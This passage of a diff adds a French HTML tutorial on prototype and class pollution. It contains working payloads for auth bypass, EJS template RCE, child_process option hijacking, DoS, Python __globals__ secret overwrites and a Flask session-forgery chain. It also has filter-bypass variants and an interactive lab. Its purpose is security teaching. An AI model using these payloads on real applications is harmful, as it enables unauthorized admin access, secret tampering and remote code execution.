+      <p><code>POST /api/settings</code> avec body : <code>{"__proto__": {"isAdmin": true}}</code></p>
+    </div>
+  </div>
+  <div class="pipe-line"></div>
+  <div class="pipe-step active">
+    <div class="pipe-num">02</div>
+    <div class="pipe-content">
+      <h4>Le serveur parse le JSON</h4>
+      <p><code>JSON.parse(body)</code> crée un objet avec <code>__proto__</code> comme clé propre. À ce stade, aucun danger.</p>
+    </div>
+  </div>
+  <div class="pipe-line"></div>
+  <div class="pipe-step active">
+    <div class="pipe-num">03</div>
+    <div class="pipe-content">
+      <h4>La fonction merge traite l'objet</h4>
+      <p>Elle itère sur les clés et tombe sur <code>"__proto__"</code>. Elle fait <code>target["__proto__"]</code> qui renvoie <code>Object.prototype</code> (le vrai prototype).</p>
+    </div>
+  </div>
+  <div class="pipe-line"></div>
+  <div class="pipe-step active">
+    <div class="pipe-num">04</div>
+    <div class="pipe-content">
+      <h4>La propriété est écrite sur le prototype</h4>
+      <p>Le merge continue et fait <code>Object.prototype["isAdmin"] = true</code>. La pollution est effective.</p>
+    </div>
+  </div>
+  <div class="pipe-line"></div>
+  <div class="pipe-step active">
+    <div class="pipe-num">05</div>
+    <div class="pipe-content">
+      <h4>Tous les objets sont affectés</h4>
+      <p>Désormais, n'importe quel <code>{}.isAdmin</code> retourne <code>true</code>. Si le code fait <code>if (user.isAdmin)</code>, c'est un bypass total.</p>
+    </div>
+  </div>
+</div>
+
+<div class="info">
+  <div class="info-title">💡 Variante : constructor.prototype</div>
+  <p>Si <code>__proto__</code> est filtré, l'attaquant peut utiliser le chemin alternatif : <code>{"constructor": {"prototype": {"isAdmin": true}}}</code>. Car <code>obj.constructor</code> pointe vers la fonction <code>Object</code>, et <code>Object.prototype</code> est le même objet cible.</p>
+</div>
+</section>
+
+<!-- ===== CHAPITRE 3 : EXPLOIT JS ===== -->
+<section class="chapter" id="ch3">
+<div class="ch-header">
+  <div class="ch-label">CHAPITRE 03 — EXPLOITATION JAVASCRIPT</div>
+  <h2 class="ch-title">Scénarios d'<span class="hl">exploitation</span> réels</h2>
+</div>
+
+<p class="txt">
+  Maintenant que vous comprenez le mécanisme, voyons les scénarios d'exploitation concrets, du plus simple au plus critique.
+</p>
+
+<div class="tabs" id="jsTabs">
+  <button class="tab-btn active" onclick="switchTab('js',0,this)">AUTH BYPASS</button>
+  <button class="tab-btn" onclick="switchTab('js',1,this)">XSS VIA TEMPLATES</button>
+  <button class="tab-btn" onclick="switchTab('js',2,this)">RCE NODE.JS</button>
+  <button class="tab-btn" onclick="switchTab('js',3,this)">DOS</button>
+</div>
+
+<div class="tab-panel active" data-group="js" data-idx="0">
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">exploit-auth-bypass.js</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="c">// ═══════════════════════════════════════════════════════</span>
+<span class="c">// SCÉNARIO : API Express.js avec gestion de rôles</span>
+<span class="c">// L'appli merge les données du body dans l'objet user</span>
+<span class="c">// ═══════════════════════════════════════════════════════</span>
+
+<span class="k">const</span> <span class="v">express</span> <span class="o">=</span> <span class="f">require</span>(<span class="s">'express'</span>);
+<span class="k">const</span> <span class="v">app</span> <span class="o">=</span> <span class="f">express</span>();
+<span class="v">app</span>.<span class="f">use</span>(<span class="v">express</span>.<span class="f">json</span>());
+
+<span class="c">// Simule une base de données utilisateurs</span>
+<span class="k">const</span> <span class="v">users</span> <span class="o">=</span> {
+  <span class="s">"alice"</span>: { <span class="p">name</span>: <span class="s">"Alice"</span>, <span class="p">role</span>: <span class="s">"user"</span> },
+  <span class="s">"bob"</span>:   { <span class="p">name</span>: <span class="s">"Bob"</span>,   <span class="p">role</span>: <span class="s">"user"</span> }
+};
+
+<span class="c">// Endpoint pour mettre à jour le profil — VULNÉRABLE</span>
+<span class="v">app</span>.<span class="f">post</span>(<span class="s">'/api/profile'</span>, (<span class="v">req</span>, <span class="v">res</span>) <span class="o">=></span> {
+  <span class="k">const</span> <span class="v">user</span> <span class="o">=</span> <span class="v">users</span>[<span class="v">req</span>.<span class="p">body</span>.<span class="p">username</span>];
+  <span class="f">merge</span>(<span class="v">user</span>, <span class="v">req</span>.<span class="p">body</span>.<span class="p">data</span>);  <span class="c">// ← DANGER</span>
+  <span class="v">res</span>.<span class="f">json</span>({ <span class="p">ok</span>: <span class="k">true</span> });
+});
+
+<span class="c">// Route admin</span>
+<span class="v">app</span>.<span class="f">get</span>(<span class="s">'/api/admin/secrets'</span>, (<span class="v">req</span>, <span class="v">res</span>) <span class="o">=></span> {
+  <span class="k">const</span> <span class="v">user</span> <span class="o">=</span> <span class="v">users</span>[<span class="v">req</span>.<span class="p">query</span>.<span class="p">user</span>];
+  <span class="k">if</span> (<span class="v">user</span>.<span class="p">isAdmin</span>) {  <span class="c">// ← Propriété qui n'existe pas normalement</span>
+    <span class="c">// Mais après pollution, {}.isAdmin === true !</span>
+    <span class="v">res</span>.<span class="f">json</span>({ <span class="p">secrets</span>: <span class="s">"TOP SECRET DATA"</span> });
+  } <span class="k">else</span> {
+    <span class="v">res</span>.<span class="f">status</span>(<span class="n">403</span>).<span class="f">json</span>({ <span class="p">error</span>: <span class="s">"Unauthorized"</span> });
+  }
+});
+
+<span class="c">// ═══ REQUÊTE DE L'ATTAQUANT ═══</span>
+<span class="c">// POST /api/profile</span>
+<span class="c">// {</span>
+<span class="c">//   "username": "alice",</span>
+<span class="c">//   "data": {"__proto__": {"isAdmin": true}}</span>
+<span class="c">// }</span>
+<span class="c">//</span>
+<span class="c">// Puis : GET /api/admin/secrets?user=bob</span>
+<span class="c">// → 200 { "secrets": "TOP SECRET DATA" }</span>
+<span class="c">// Bob n'a JAMAIS été admin, mais Object.prototype.isAdmin === true</span></pre></div>
+</div>
+</div>
+
+<div class="tab-panel" data-group="js" data-idx="1">
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">exploit-xss-ejs.js</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="c">// ═══════════════════════════════════════════════════════</span>
+<span class="c">// XSS via EJS Template Engine (CVE-2022-29078)</span>
+<span class="c">// EJS lit des propriétés qui peuvent être polluées</span>
+<span class="c">// ═══════════════════════════════════════════════════════</span>
+
+<span class="c">// EJS compile les templates avec une option "outputFunctionName"</span>
+<span class="c">// Si cette option est polluée, on peut injecter du code JS</span>
+
+<span class="c">// Payload pour polluer EJS :</span>
+<span class="k">const</span> <span class="v">payload</span> <span class="o">=</span> {
+  <span class="s">"__proto__"</span>: {
+    <span class="c">// EJS utilise cette propriété pendant la compilation</span>
+    <span class="s">"outputFunctionName"</span>: <span class="s">`x;
+      var require = global.process.mainModule.require;
+      var exec = require('child_process').execSync;
+      var result = exec('whoami').toString();
+      x`</span>
+  }
+};
+
+<span class="c">// Quand EJS fait : new Function("outputFunctionName", ...)</span>
+<span class="c">// Le code injecté s'exécute côté serveur → RCE !</span>
+
+<span class="c">// Variante pour XSS côté client (Handlebars, Pug...)</span>
+<span class="c">// {"__proto__": {"allowProtoPropertiesByDefault": true,</span>
+<span class="c">//                "allowedProtoProperties": {"_parent": true}}}</span>
+
+<span class="c">// Autres propriétés EJS exploitables :</span>
+<span class="c">// - "client": true             → change le mode de compilation</span>
+<span class="c">// - "escapeFunction": "..."    → remplace la fonction d'échappement</span>
+<span class="c">// - "localsName": "..."        → change le nom de la variable locale</span>
+<span class="c">// - "destructuredLocals": []   → injecte dans le destructuring</span></pre></div>
+</div>
+</div>
+
+<div class="tab-panel" data-group="js" data-idx="2">
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">exploit-rce-spawn.js</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="c">// ═══════════════════════════════════════════════════════</span>
+<span class="c">// RCE via child_process.spawn() / fork() / exec()</span>
+<span class="c">// Node.js lit des options depuis l'objet options passé,</span>
+<span class="c">// et ces options peuvent être héritées du prototype pollué</span>
+<span class="c">// ═══════════════════════════════════════════════════════</span>
+
+<span class="c">// ──── VECTEUR 1 : spawn avec shell=true ────</span>
+<span class="c">// Normalement spawn n'utilise pas de shell</span>
+<span class="c">// Mais si on pollue "shell": true...</span>
+
+<span class="k">const</span> <span class="v">payload1</span> <span class="o">=</span> {
+  <span class="s">"__proto__"</span>: {
+    <span class="s">"shell"</span>: <span class="k">true</span>
+    <span class="c">// Maintenant child_process.spawn() utilise un shell</span>
+    <span class="c">// Ce qui ouvre la porte à l'injection de commandes</span>
+  }
+};
+
+<span class="c">// ──── VECTEUR 2 : env + NODE_OPTIONS ────</span>
+<span class="k">const</span> <span class="v">payload2</span> <span class="o">=</span> {
+  <span class="s">"__proto__"</span>: {
+    <span class="s">"env"</span>: {
+      <span class="s">"NODE_OPTIONS"</span>: <span class="s">"--require=/tmp/evil.js"</span>,
+      <span class="s">"PATH"</span>: <span class="s">"/usr/bin"</span>
+    }
+  }
+};
+<span class="c">// Quand Node.js fork() un process enfant, il hérite</span>
+<span class="c">// de env pollué → charge notre script malveillant</span>
+
+<span class="c">// ──── VECTEUR 3 : main module ────</span>
+<span class="k">const</span> <span class="v">payload3</span> <span class="o">=</span> {
+  <span class="s">"__proto__"</span>: {
+    <span class="s">"argv0"</span>: <span class="s">"node"</span>,
+    <span class="s">"shell"</span>: <span class="s">"/proc/self/exe"</span>,
+    <span class="c">// Force l'utilisation de /proc/self/exe comme shell</span>
+    <span class="c">// Combined with NODE_OPTIONS, donne un RCE complet</span>
+  }
+};
+
+<span class="c">// Impact : exécution de code arbitraire sur le serveur</span>
+<span class="c">// Utilisé dans des attaques réelles sur npm packages</span></pre></div>
+</div>
+
+<div class="warn">
+  <div class="warn-title">⚠ Avertissement légal</div>
+  <p>Ces techniques sont présentées à des fins éducatives. L'exploitation de vulnérabilités sur des systèmes sans autorisation écrite explicite est un <strong>délit pénal</strong>. Utilisez ces connaissances dans le cadre de pentests autorisés, de programmes de bug bounty, ou sur vos propres systèmes.</p>
+</div>
+</div>
+
+<div class="tab-panel" data-group="js" data-idx="3">
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">exploit-dos.js</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="c">// ═══════════════════════════════════════════════════════</span>
+<span class="c">// Déni de service (DoS) par pollution</span>
+<span class="c">// Moins spectaculaire que RCE mais très efficace</span>
+<span class="c">// ═══════════════════════════════════════════════════════</span>
+
+<span class="c">// ──── Crash de l'application ────</span>
+<span class="k">const</span> <span class="v">payload</span> <span class="o">=</span> {
+  <span class="s">"__proto__"</span>: {
+    <span class="s">"toString"</span>: <span class="n">1</span>,
+    <span class="c">// Remplace toString par un nombre</span>
+    <span class="c">// Tout appel à .toString() crashe avec TypeError</span>
+    <span class="s">"valueOf"</span>: <span class="n">1</span>,
+    <span class="c">// Idem pour valueOf</span>
+  }
+};
+
+<span class="c">// ──── Boucle infinie ────</span>
+<span class="k">const</span> <span class="v">payload2</span> <span class="o">=</span> {
+  <span class="s">"__proto__"</span>: {
+    <span class="s">"length"</span>: <span class="n">1e10</span>
+    <span class="c">// Si du code utilise for...in ou Array.from sur des objets</span>
+    <span class="c">// avec un "length" hérité, ça peut créer des boucles</span>
+    <span class="c">// quasi-infinies ou des allocations mémoire massives</span>
+  }
+};
+
+<span class="c">// ──── Corruption de JSON.stringify ────</span>
+<span class="k">const</span> <span class="v">payload3</span> <span class="o">=</span> {
+  <span class="s">"__proto__"</span>: {
+    <span class="s">"toJSON"</span>: <span class="s">"not a function"</span>
+    <span class="c">// Crashe tout appel à JSON.stringify() sur un objet</span>
+  }
+};
+
+<span class="c">// Impact : l'application crashe ou devient inutilisable</span>
+<span class="c">// Souvent ignoré mais potentiellement dévastateur en prod</span></pre></div>
+</div>
+</div>
+</section>
+
+<!-- ===== CHAPITRE 4 : EXPLOIT PYTHON ===== -->
+<section class="chapter" id="ch4">
+<div class="ch-header">
+  <div class="ch-label">CHAPITRE 04 — EXPLOITATION PYTHON</div>
+  <h2 class="ch-title">Class Pollution en <span class="hl">Python</span></h2>
+</div>
+
+<p class="txt">
+  Python n'a pas de prototypes, mais un système de classes tout aussi exploitable. Les objets Python ont des <strong>attributs spéciaux</strong> (<em>dunder attributes</em>) qui permettent de remonter la hiérarchie des classes et d'accéder à des objets normalement inaccessibles.
+</p>
+
+<div class="concept">
+  <div class="concept-title">🐍 Attributs spéciaux exploitables</div>
+  <p>
+    <code>__class__</code> → la classe de l'instance<br>
+    <code>__base__</code> / <code>__bases__</code> → la/les classe(s) parente(s)<br>
+    <code>__subclasses__()</code> → toutes les sous-classes<br>
+    <code>__init__</code> → le constructeur (c'est une fonction)<br>
+    <code>__globals__</code> → les variables globales du module de la fonction<br>
+    <code>__dict__</code> → le dictionnaire d'attributs de la classe
+  </p>
+</div>
+
+<div class="tabs" id="pyTabs">
+  <button class="tab-btn active" onclick="switchTab('py',0,this)">BASES</button>
+  <button class="tab-btn" onclick="switchTab('py',1,this)">MERGE VULNÉRABLE</button>
+  <button class="tab-btn" onclick="switchTab('py',2,this)">GLOBALS HIJACK</button>
+  <button class="tab-btn" onclick="switchTab('py',3,this)">FLASK RCE</button>
+</div>
+
+<div class="tab-panel active" data-group="py" data-idx="0">
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">python-class-basics.py</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="c"># En Python, les classes sont des objets MUTABLES</span>
+<span class="c"># On peut modifier les attributs de classe à la volée</span>
+
+<span class="k">class</span> <span class="f">User</span>:
+    <span class="v">is_admin</span> <span class="o">=</span> <span class="k">False</span>
+    <span class="v">can_delete</span> <span class="o">=</span> <span class="k">False</span>
+
+<span class="v">alice</span> <span class="o">=</span> <span class="f">User</span>()
+<span class="v">bob</span> <span class="o">=</span> <span class="f">User</span>()
+
+<span class="f">print</span>(<span class="v">alice</span>.<span class="p">is_admin</span>)  <span class="c"># False</span>
+<span class="f">print</span>(<span class="v">bob</span>.<span class="p">is_admin</span>)    <span class="c"># False</span>
+
+<span class="c"># ☠️ Pollution via __class__</span>
+<span class="c"># Modifier un attribut de classe affecte TOUTES les instances</span>
+<span class="v">alice</span>.<span class="p">__class__</span>.<span class="p">is_admin</span> <span class="o">=</span> <span class="k">True</span>
+
+<span class="f">print</span>(<span class="v">alice</span>.<span class="p">is_admin</span>)  <span class="c"># True  ← modifié directement</span>
+<span class="f">print</span>(<span class="v">bob</span>.<span class="p">is_admin</span>)    <span class="c"># True  ← POLLUÉ aussi !</span>
+
+<span class="c"># On peut même remonter plus haut</span>
+<span class="k">class</span> <span class="f">Admin</span>(<span class="f">User</span>):
+    <span class="k">pass</span>
+
+<span class="v">admin</span> <span class="o">=</span> <span class="f">Admin</span>()
+<span class="c"># admin.__class__.__base__ === User</span>
+<span class="c"># admin.__class__.__base__.__base__ === object</span>
+<span class="c"># On peut polluer N'IMPORTE QUELLE classe parente</span></pre></div>
+</div>
+
+<div class="diagram">
+instance (alice)
+    │
+    ├── __class__ ──→ User
+    │                   │
+    │                   ├── __base__ ──→ object
+    │                   │                  │
+    │                   │                  └── (toutes les classes héritent d'object)
+    │                   │
+    │                   ├── __dict__ ──→ {'is_admin': False, ...}
+    │                   │
+    │                   └── __init__ ──→ &lt;function&gt;
+    │                                      │
+    │                                      └── __globals__ ──→ MODULE GLOBALS !
+    │                                           (SECRET_KEY, os, sys, app, ...)
+</div>
+</div>
+
+<div class="tab-panel" data-group="py" data-idx="1">
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">python-vuln-merge.py</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="c"># ❌ Fonction merge vulnérable — pattern courant en Python</span>
+<span class="k">def</span> <span class="f">merge</span>(<span class="v">target</span>, <span class="v">source</span>):
+    <span class="k">for</span> <span class="v">key</span>, <span class="v">value</span> <span class="k">in</span> <span class="v">source</span>.<span class="f">items</span>():
+        <span class="c"># Si la valeur est un dict, on merge récursivement</span>
+        <span class="k">if</span> <span class="f">hasattr</span>(<span class="v">target</span>, <span class="v">key</span>) <span class="k">and</span> <span class="f">isinstance</span>(<span class="v">value</span>, <span class="v">dict</span>):
+            <span class="f">merge</span>(<span class="f">getattr</span>(<span class="v">target</span>, <span class="v">key</span>), <span class="v">value</span>)
+        <span class="k">else</span>:
+            <span class="f">setattr</span>(<span class="v">target</span>, <span class="v">key</span>, <span class="v">value</span>)
+            <span class="c"># ↑ setattr avec des clés non filtrées = DANGER</span>
+
+<span class="c"># L'attaquant envoie ce payload :</span>
+<span class="v">payload</span> <span class="o">=</span> {
+    <span class="s">"__class__"</span>: {
+        <span class="s">"__base__"</span>: {
+            <span class="s">"is_admin"</span>: <span class="k">True</span>,
+            <span class="s">"can_delete"</span>: <span class="k">True</span>
+        }
+    }
+}
+
+<span class="c"># Exécution :</span>
+<span class="c"># 1. merge(emp, payload)</span>
+<span class="c"># 2. key = "__class__" → getattr(emp, "__class__") = Employee class</span>
+<span class="c"># 3. Recurse: merge(Employee, {"__base__": {"is_admin": True}})</span>
+<span class="c"># 4. key = "__base__" → getattr(Employee, "__base__") = object class</span>
+<span class="c"># 5. Recurse: merge(object, {"is_admin": True})</span>
+<span class="c"># 6. setattr(object, "is_admin", True) → POLLUTION GLOBALE !</span>
+
+<span class="k">class</span> <span class="f">Employee</span>:
+    <span class="v">is_admin</span> <span class="o">=</span> <span class="k">False</span>
+
+<span class="v">emp</span> <span class="o">=</span> <span class="f">Employee</span>()
+<span class="f">merge</span>(<span class="v">emp</span>, <span class="v">payload</span>)
+
+<span class="c"># Toutes les classes héritant d'object sont polluées</span>
+<span class="f">print</span>(<span class="f">Employee</span>.<span class="p">is_admin</span>)  <span class="c"># True !</span></pre></div>
+</div>
+</div>
+
+<div class="tab-panel" data-group="py" data-idx="2">
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">python-globals-hijack.py</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="c"># ═══════════════════════════════════════════════════════</span>
+<span class="c"># HIJACK DES GLOBALS VIA __init__.__globals__</span>
+<span class="c"># Chaque fonction Python a accès aux globals de son module</span>
+<span class="c"># ═══════════════════════════════════════════════════════</span>
+
+<span class="k">import</span> <span class="v">os</span>
+
+<span class="v">SECRET_KEY</span> <span class="o">=</span> <span class="s">"super-secret-key-2024"</span>
+<span class="v">DEBUG</span> <span class="o">=</span> <span class="k">False</span>
+
+<span class="k">class</span> <span class="f">Config</span>:
+    <span class="k">pass</span>
+
+<span class="v">cfg</span> <span class="o">=</span> <span class="f">Config</span>()
+
+<span class="c"># L'attaquant peut accéder aux globals via :</span>
+<span class="c"># cfg.__class__.__init__.__globals__</span>
+<span class="c"># Cela pointe vers le dict global du module !</span>
+
+<span class="f">print</span>(<span class="v">cfg</span>.<span class="p">__class__</span>.<span class="p">__init__</span>.<span class="p">__globals__</span>[<span class="s">"SECRET_KEY"</span>])
+<span class="c"># "super-secret-key-2024" ← FUITE DE SECRET !</span>
+
+<span class="c"># Payload pour RÉÉCRIRE les globals :</span>
+<span class="v">payload</span> <span class="o">=</span> {
+    <span class="s">"__class__"</span>: {
+        <span class="s">"__init__"</span>: {
+            <span class="s">"__globals__"</span>: {
+                <span class="s">"SECRET_KEY"</span>: <span class="s">"attacker-controlled"</span>,
+                <span class="s">"DEBUG"</span>: <span class="k">True</span>,
+                <span class="c"># Peut aussi écraser os, sys, etc.</span>
+            }
+        }
+    }
+}
+
+<span class="c"># Après merge avec le payload :</span>
+<span class="c"># - SECRET_KEY est modifié → session forgery possible</span>
+<span class="c"># - DEBUG activé → messages d'erreur détaillés exposés</span>
+<span class="c"># - os module remplacé → comportement imprévisible</span></pre></div>
+</div>
+</div>
+
+<div class="tab-panel" data-group="py" data-idx="3">
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">python-flask-rce.py</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="c"># ═══════════════════════════════════════════════════════</span>
+<span class="c"># RCE dans une app Flask via class pollution</span>
+<span class="c"># Scénario: endpoint qui met à jour un objet config</span>
+<span class="c"># ═══════════════════════════════════════════════════════</span>
+
+<span class="k">from</span> <span class="v">flask</span> <span class="k">import</span> <span class="v">Flask</span>, <span class="v">request</span>
+<span class="k">import</span> <span class="v">subprocess</span>
+
+<span class="v">app</span> <span class="o">=</span> <span class="f">Flask</span>(<span class="v">__name__</span>)
+<span class="v">app</span>.<span class="p">config</span>[<span class="s">'SECRET_KEY'</span>] <span class="o">=</span> <span class="s">'production-secret'</span>
+
+<span class="k">class</span> <span class="f">UserPreferences</span>:
+    <span class="v">theme</span> <span class="o">=</span> <span class="s">"dark"</span>
+    <span class="v">language</span> <span class="o">=</span> <span class="s">"fr"</span>
+
+<span class="c"># Merge vulnérable (même que précédemment)</span>
+<span class="k">def</span> <span class="f">merge</span>(<span class="v">target</span>, <span class="v">source</span>):
+    <span class="k">for</span> <span class="v">key</span>, <span class="v">value</span> <span class="k">in</span> <span class="v">source</span>.<span class="f">items</span>():
+        <span class="k">if</span> <span class="f">hasattr</span>(<span class="v">target</span>, <span class="v">key</span>) <span class="k">and</span> <span class="f">isinstance</span>(<span class="v">value</span>, <span class="v">dict</span>):
+            <span class="f">merge</span>(<span class="f">getattr</span>(<span class="v">target</span>, <span class="v">key</span>), <span class="v">value</span>)
+        <span class="k">else</span>:
+            <span class="f">setattr</span>(<span class="v">target</span>, <span class="v">key</span>, <span class="v">value</span>)
+
+<span class="v">@app</span>.<span class="f">route</span>(<span class="s">'/prefs'</span>, <span class="v">methods</span><span class="o">=</span>[<span class="s">'POST'</span>])
+<span class="k">def</span> <span class="f">update_prefs</span>():
+    <span class="v">prefs</span> <span class="o">=</span> <span class="f">UserPreferences</span>()
+    <span class="f">merge</span>(<span class="v">prefs</span>, <span class="v">request</span>.<span class="f">get_json</span>())  <span class="c"># ← Vulnérable</span>
+    <span class="k">return</span> <span class="s">"OK"</span>
+
+<span class="c"># ═══ CHAÎNE D'ATTAQUE ═══</span>
+<span class="c"># Étape 1: Modifier SECRET_KEY de Flask</span>
+<span class="c"># POST /prefs</span>
+<span class="c"># {"__class__":{"__init__":{"__globals__":</span>
+<span class="c">#   {"app":{"config":{"SECRET_KEY":"evil"}}}}}}</span>
+<span class="c">#</span>
+<span class="c"># Étape 2: Forger un cookie de session admin</span>
+<span class="c"># flask-unsign --sign -c '{"user":"admin"}' --secret 'evil'</span>
+<span class="c">#</span>
+<span class="c"># Étape 3: Accéder avec le cookie forgé → admin access</span></pre></div>
+</div>
+</div>
+</section>
+
+<!-- ===== CHAPITRE 5 : TECHNIQUES AVANCÉES ===== -->
+<section class="chapter" id="ch5">
+<div class="ch-header">
+  <div class="ch-label">CHAPITRE 05 — TECHNIQUES AVANCÉES</div>
+  <h2 class="ch-title">Vecteurs <span class="hl">alternatifs</span> et cas réels</h2>
+</div>
+
+<p class="txt">
+  Au-delà du merge classique, la pollution peut passer par de nombreux autres vecteurs. Voici les techniques avancées utilisées en conditions réelles.
+</p>
+
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">advanced-vectors.js</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="c">// ═══ VECTEUR 1 : Query string (Express qs parser) ═══</span>
+<span class="c">// GET /search?__proto__[isAdmin]=true</span>
+<span class="c">// Le parser qs convertit ceci en objet avec __proto__</span>
+<span class="c">// Certaines versions de qs sont vulnérables</span>
+
+<span class="c">// ═══ VECTEUR 2 : path-based assignment ═══</span>
+<span class="k">function</span> <span class="f">setPath</span>(<span class="v">obj</span>, <span class="v">path</span>, <span class="v">value</span>) {
+  <span class="k">const</span> <span class="v">keys</span> <span class="o">=</span> <span class="v">path</span>.<span class="f">split</span>(<span class="s">'.'</span>);
+  <span class="k">let</span> <span class="v">current</span> <span class="o">=</span> <span class="v">obj</span>;
+  <span class="k">for</span> (<span class="k">let</span> <span class="v">i</span> <span class="o">=</span> <span class="n">0</span>; <span class="v">i</span> <span class="o">&lt;</span> <span class="v">keys</span>.<span class="p">length</span> <span class="o">-</span> <span class="n">1</span>; <span class="v">i</span><span class="o">++</span>) {
+    <span class="v">current</span> <span class="o">=</span> <span class="v">current</span>[<span class="v">keys</span>[<span class="v">i</span>]];  <span class="c">// ← Vulnérable si keys[i] = "__proto__"</span>
+  }
+  <span class="v">current</span>[<span class="v">keys</span>.<span class="f">at</span>(<span class="o">-</span><span class="n">1</span>)] <span class="o">=</span> <span class="v">value</span>;
+}
+<span class="c">// setPath({}, "__proto__.isAdmin", true) → pollution !</span>
+
+<span class="c">// ═══ VECTEUR 3 : Object.assign() deep ═══</span>
+<span class="c">// Object.assign seul n'est PAS vulnérable (shallow copy)</span>
+<span class="c">// Mais une implémentation custom de deepAssign peut l'être</span>
+
+<span class="c">// ═══ VECTEUR 4 : Lodash _.set() (versions < 4.17.12) ═══</span>
+<span class="c">// _.set({}, '__proto__.isAdmin', true)</span>
+<span class="c">// _.defaultsDeep({}, JSON.parse('{"__proto__":{"x":1}}'))</span>
+
+<span class="c">// ═══ VECTEUR 5 : class-based via constructor ═══</span>
+<span class="c">// Si __proto__ est filtré, utiliser le chemin constructor :</span>
+<span class="v">JSON</span>.<span class="f">parse</span>(<span class="s">'{"constructor":{"prototype":{"isAdmin":true}}}'</span>)
+<span class="c">// obj.constructor === Object</span>
+<span class="c">// obj.constructor.prototype === Object.prototype</span>
+<span class="c">// Même résultat, bypass le filtre sur "__proto__" !</span></pre></div>
+</div>
+
+<p class="txt">
+  Voici les CVEs réelles les plus notables liées à la Prototype Pollution :
+</p>
+
+<table>
+  <thead>
+    <tr><th>CVE</th><th>Package</th><th>Sévérité</th><th>Vecteur</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="color:var(--green);font-family:var(--font)">CVE-2019-10744</td>
+      <td>lodash (&lt;4.17.12)</td>
+      <td><span class="sev crit">9.8 CRIT</span></td>
+      <td>defaultsDeep, merge, zipObjectDeep</td>
+    </tr>
+    <tr>
+      <td style="color:var(--green);font-family:var(--font)">CVE-2022-29078</td>
+      <td>ejs (&lt;3.1.7)</td>
+      <td><span class="sev crit">9.8 CRIT</span></td>
+      <td>RCE via outputFunctionName pollution</td>
+    </tr>
+    <tr>
+      <td style="color:var(--green);font-family:var(--font)">CVE-2021-25928</td>
+      <td>safe-obj</td>
+      <td><span class="sev crit">9.8 CRIT</span></td>
+      <td>expand() function</td>
+    </tr>
+    <tr>
+      <td style="color:var(--green);font-family:var(--font)">CVE-2022-21824</td>
+      <td>Node.js core</td>
+      <td><span class="sev high">7.5 HIGH</span></td>
+      <td>console.table() PP</td>
+    </tr>
+    <tr>
+      <td style="color:var(--green);font-family:var(--font)">CVE-2020-28498</td>
+      <td>elliptic</td>
+      <td><span class="sev high">7.4 HIGH</span></td>
+      <td>EC curve parser</td>
+    </tr>
+    <tr>
+      <td style="color:var(--green);font-family:var(--font)">CVE-2020-36632</td>
+      <td>flat (&lt;5.0.1)</td>
+      <td><span class="sev crit">9.8 CRIT</span></td>
+      <td>unflatten() function</td>
+    </tr>
+  </tbody>
+</table>
+</section>
+
+<!-- ===== CHAPITRE 6 : LAB INTERACTIF ===== -->
+<section class="chapter" id="ch6">
+<div class="ch-header">
+  <div class="ch-label">CHAPITRE 06 — LABORATOIRE</div>
+  <h2 class="ch-title">Hands-on <span class="hl">exploitation</span></h2>
+</div>
+
+<p class="txt">
+  Mettez en pratique ce que vous avez appris. Ces simulations s'exécutent dans votre navigateur, sans aucun risque.
+</p>
+
+<!-- LAB 1 -->
+<div class="lab">
+  <div class="lab-bar">
+    <span class="tag live">● LIVE</span>
+    <h4>LAB 01 — Pollution Simulator</h4>
+  </div>
+  <div class="lab-body">
+    <p class="txt" style="margin-bottom:16px">Entrez un payload JSON et observez comment il pollue le prototype. Le simulateur montre chaque étape du processus.</p>
+    <div class="lab-grid">
+      <div class="lab-col">
+        <label>payload json</label>
+        <textarea id="lab1-in" rows="6" spellcheck="false">{"__proto__": {"isAdmin": true, "role": "root"}}</textarea>
+        <button class="lab-run" onclick="runLab1()">▶ EXÉCUTER LE MERGE</button>
+      </div>
+      <div class="lab-col">
+        <label>résultat</label>
+        <div class="lab-output" id="lab1-out"><span style="color:var(--dim)">root@lab:~# En attente d'exécution...</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- LAB 2 -->
+<div class="lab">
+  <div class="lab-bar">
+    <span class="tag live">● LIVE</span>
+    <h4>LAB 02 — Code Vulnerability Scanner</h4>
+  </div>
+  <div class="lab-body">
+    <p class="txt" style="margin-bottom:16px">Collez une fonction de merge (JS ou Python) et le scanner analysera les vecteurs d'attaque possibles.</p>
+    <div class="lab-grid">
+      <div class="lab-col">
+        <label>code à analyser</label>
+        <textarea id="lab2-in" rows="8" spellcheck="false">function merge(target, source) {
+  for (let key in source) {
+    if (typeof source[key] === 'object') {
+      if (typeof target[key] !== 'object')
+        target[key] = {};
+      merge(target[key], source[key]);
+    } else {
+      target[key] = source[key];
+    }
+  }
+}</textarea>
+        <button class="lab-run" onclick="runLab2()">▶ SCANNER</button>
+      </div>
+      <div class="lab-col">
+        <label>rapport de vulnérabilité</label>
